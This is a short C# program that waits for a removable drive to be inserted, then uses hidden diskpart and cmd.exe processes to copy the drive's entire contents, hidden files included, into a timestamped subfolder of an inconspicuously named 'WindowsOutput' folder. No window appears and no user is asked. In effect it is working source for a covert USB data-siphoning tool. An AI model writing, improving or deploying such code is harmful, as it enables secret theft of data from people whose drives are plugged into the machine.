using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net;

namespace removable_disk_copying
{
    internal class Program
    {
        static void Main(string[] args)
        {
            listingAndCopying();
            
        }

        static void listingAndCopying()
        {
            List<string> letters = new List<string>();
            
            while (true)
            {
                Process process = new Process();
                process.StartInfo.FileName = "diskpart.exe";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.StandardInput.WriteLine("list volume");
                process.StandardInput.WriteLine("exit");
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                string table = output.Split(new string[] { "DISKPART>" }, StringSplitOptions.None)[1];
                var rows = table.Split(new string[] { "\n" }, StringSplitOptions.None);
                for (int i = 3; i < rows.Length; i++)
                {
                    if (rows[i].Contains("Removable"))
                    { 
                        string label = rows[i].Split(new string[] { " " }, StringSplitOptions.None)[8];
                        letters.Add(label);
                    }
                }
                if (letters.Count > 0)
                {
                    break;
                }
                else 
                {
                    continue;
                }
            }

            Process process1 = new Process();
            process1.StartInfo.FileName = "cmd.exe";
            process1.StartInfo.UseShellExecute = false;
            process1.StartInfo.CreateNoWindow = true;
            process1.StartInfo.RedirectStandardInput = true;
            process1.StartInfo.RedirectStandardOutput = true;
            process1.Start();
            process1.StandardInput.WriteLine(@"cd\");
            process1.StandardInput.WriteLine("dir");
            process1.StandardInput.WriteLine("exit");
            string output1 = process1.StandardOutput.ReadToEnd();
            process1.WaitForExit();

            Process process2 = new Process();
            process2.StartInfo.FileName = "cmd.exe";
            process2.StartInfo.UseShellExecute = false;
            process2.StartInfo.CreateNoWindow = true;
            process2.StartInfo.RedirectStandardInput = true;
            process2.StartInfo.RedirectStandardOutput = true;
            process2.Start();

            if (output1.Contains("WindowsOutput"))
            {
                process2.StandardInput.WriteLine(@"cd\");
                process2.StandardInput.WriteLine("cd WindowsOutput");
                DateTime now = DateTime.Now;
                process2.StandardInput.WriteLine("md "+now.ToString().Replace(" ", "").Replace("/", ".").Replace(":", "."));
                process2.StandardInput.WriteLine("cd "+now.ToString().Replace(" ", "").Replace("/", ".").Replace(":", "."));
                for (int i = 0; i < letters.Count; i++)
                {
                    process2.StandardInput.WriteLine("xcopy "+letters[i]+": /H /E /I /K /Y /C");
                }
                process2.StandardInput.WriteLine("exit");
                process2.WaitForExit();
            }

            else
            {
                process2.StandardInput.WriteLine(@"cd\");
                process2.StandardInput.WriteLine("md WindowsOutput");
                process2.StandardInput.WriteLine("cd WindowsOutput");
                DateTime now = DateTime.Now;
                process2.StandardInput.WriteLine("md " + now.ToString().Replace(" ", "").Replace("/", ".").Replace(":", "."));
                process2.StandardInput.WriteLine("cd " + now.ToString().Replace(" ", "").Replace("/", ".").Replace(":", "."));
                for (int i = 0; i < letters.Count; i++)
                {
                    process2.StandardInput.WriteLine("xcopy " + letters[i] + ": /H /E /I /K /Y /C");
                }
                process2.StandardInput.WriteLine("exit");
                process2.WaitForExit();
            }


        }

    }
}
